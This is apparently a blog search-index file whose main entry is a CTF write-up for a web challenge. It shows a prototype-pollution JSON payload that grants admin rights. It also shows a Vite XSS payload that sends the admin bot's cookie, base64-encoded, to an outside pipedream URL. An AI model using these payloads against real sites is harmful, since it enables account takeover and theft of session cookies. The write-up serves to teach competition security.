[{"content":"","permalink":"//localhost:1313/posts/how-to-make-a-simple-link-shortener/","summary":"Sample article showcasing basic code syntax and formatting for HTML elements.","title":"Simple URL shortener"},{"content":"Last week i participated with my team ResetSec in San Diego CTF 2024 . Overall it was a pretty fun ctf , lots of interesting challenge .\nFood-without-salt After getting the binary and open it . The challenge file seems to be a GoDot game (version xx )\n","permalink":"//localhost:1313/posts/sd-ctf-2024/","summary":"Last week i participated with my team ResetSec in San Diego CTF 2024 . Overall it was a pretty fun ctf , lots of interesting challenge .\nFood-without-salt After getting the binary and open it . The challenge file seems to be a GoDot game (version xx )","title":"San Diego CTF 2024 writeups"},{"content":"Web/Amourned notes For this challenge there is two parts . Figuring how to write a note as admin and then exploit an xss in vite (dependancy of the project) . Remember boys and gal always run npm audit\nBelow is the function on the server to create new user\napp.post(\u0026#34;/create\u0026#34;, async (req, res, next) =\u0026gt; { let obj = duplicate(req.body); if (obj.uname === \u0026#34;admin\u0026#34; \u0026amp;\u0026amp; obj.pass == process.env.PASSWORD) { obj.isAdmin = true; } if (obj.isAdmin) { const newEntry = req.body; This is classic proton pollution . It happen in js when user input \u0026ldquo;__ proto__\u0026rdquo; See more here . Lucky i remember this because there is \u0026ldquo;blade-runner\u0026rdquo; challenge from mapleCTF 2023 that has same challenge\nSo if you input this payload you can effectively create a note as admin\n\u0026#34;__proto__\u0026#34;:{ \u0026#34;uname\u0026#34;:\u0026#34;admin\u0026#34;, \u0026#34;isAdmin\u0026#34;: true } ,\u0026#34;pass\u0026#34;:\u0026#34;Doe\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Your note...asd\u0026#34;} With a quick look to the source code , we can see the flag is set in cookie so we will need to dump it . The question is how ???\n// Set Flag await page.setCookie({ name: \u0026#34;flag\u0026#34;, httpOnly: false, value: CONFIG.APPFLAG, url: CONFIG.APPURL }) // Visit URL from user console.log(`bot visiting ${urlToVisit}`); await page.goto(urlToVisit, { waitUntil: \u0026#39;networkidle2\u0026#39; }); await new Promise(resolve =\u0026gt; setTimeout(resolve, 5000)); It does filter all the sensitive possible thing from html input at \u0026#39;/posts\u0026#39; const escapeHtmlReplaceMap = { \u0026#39;\u0026amp;\u0026#39;: \u0026#39;;\u0026#39;, \u0026#34;\u0026#39;\u0026#34;: \u0026#39;;\u0026#39;, \u0026#39;`\u0026#39;: \u0026#39;;\u0026#39;, \u0026#39;\u0026#34;\u0026#39;: \u0026#39;;\u0026#39;, \u0026#39;\u0026lt;\u0026#39;: \u0026#39;;\u0026#39;, \u0026#39;\u0026gt;\u0026#39;: \u0026#39;;\u0026#39;, \u0026#34;!\u0026#34;:\u0026#34;;\u0026#34;, \u0026#34;_\u0026#34;:\u0026#34;;\u0026#34;, \u0026#34;-\u0026#34;:\u0026#34;;\u0026#34;, \u0026#34;*\u0026#34;:\u0026#34;;\u0026#34;, \u0026#34;[\u0026#34;:\u0026#34;;\u0026#34;, \u0026#34;{\u0026#34;:\u0026#34;;\u0026#34;, \u0026#34;}\u0026#34;:\u0026#34;;\u0026#34;, \u0026#34;|\u0026#34;:\u0026#34;;\u0026#34;, \u0026#34;/\u0026#34;:\u0026#34;;\u0026#34;, \u0026#39;\u0026#34;\u0026#39;:\u0026#34;;\u0026#34;, \u0026#39;(\u0026#39;:\u0026#34;;\u0026#34;, \u0026#39;)\u0026#39;:\u0026#34;;\u0026#34;, } /** * @param {string} string * @returns {string} */ export function escapeHtml(string) { return string.replace(/[\u0026amp;\u0026#39;`\u0026#34;\u0026lt;\u0026gt;]/g, (match) =\u0026gt; escapeHtmlReplaceMap[match]) } npm audit command output\n└─$ npm audit vite 4.4.0 - 4.4.11 Severity: moderate Vite XSS vulnerability in `server.transformIndexHtml` via URL payload - https://github.com/advisories/GHSA-92r3-m2mg-pj97 fix available via `npm audit fix` node_modules/vite 1 moderate severity vulnerability So npm audit was able to id one vulnerbility . After reading the CVE POC .The payload need to input to admin /report\nhttp://localhost:3000/posts/\u0026lt;code\u0026gt;/?\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;window.location.href=`https://eno02ecudm9nm.x.pipedream.net/?cookie=${btoa(document.cookie) }` \u0026lt;/script\u0026gt; ","permalink":"//localhost:1313/posts/backdoor-ctf-2023/","summary":"Challenge write ups for BackDoor CTF 2023","title":"Backdoor CTF 2023"},{"content":"","permalink":"//localhost:1313/posts/cyber-apocalypse-2024/","summary":"Challenge write ups for BackDoor CTF 2023","title":"Backdoor CTF 2023"}]